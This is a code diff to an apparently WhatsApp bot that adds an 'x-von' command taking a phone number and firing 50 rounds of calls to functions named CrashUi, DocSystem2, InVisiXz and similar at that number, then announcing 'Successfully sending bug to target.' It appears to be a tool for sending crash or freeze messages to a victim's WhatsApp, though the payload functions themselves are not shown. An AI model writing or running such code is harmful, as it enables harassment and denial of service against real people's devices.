@@ -528,7 +528,61 @@ or type this command *inside the channel*.`,
 
   break;
 }
+case 'x-von': {
+  if (!q) return reply(`Example: ${prefix + command} 62×××`);
+  target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 
+  await lubyz.sendMessage(m.chat, {
+    text: "Processing bug my bro 🐉",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+
+  for (let i = 0; i < 50; i++) {
+    await Combox(target);
+    await DocSystem2(target, Null);
+    await CrashUi(target, Null);
+    await InVisiXz(target, Null);
+    await InVisiLoc(target, Null);
+    await Combox1(from, jumlah);
+    await Combox2(from, jumlah);
+  }
+
+  await lubyz.sendMessage(m.chat, {
+    text: "Successfully sending bug to target.",
+    contextInfo: {
+      mentionedJid: [m.sender],
+      forwardedNewsletterMessageInfo: {
+        newsletterName: "Ξ KINGV0N ⋮ BINΔRY BΔSE Ξ ⧉ DEV NESTΞ",
+        newsletterJid: `120363382959814921@newsletter`
+      },
+      isForwarded: true,
+      externalAdReply: {
+        showAdAttribution: true,
+        title: `KINGVON MD`,
+        mediaType: 3,
+        renderLargerThumbnail: false,
+        thumbnailUrl: 'https://files.catbox.moe/mtvyj5.jpg',
+        sourceUrl: `https://whatsapp.com/channel/0029Vb5tbcZEKyZEHbicrV1y`
+      }
+    }
+  }, { quoted: qloc });
+}
+break;
  case 'addowner': {
 if (!Access) return reply(msg.owner)
 if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} `)
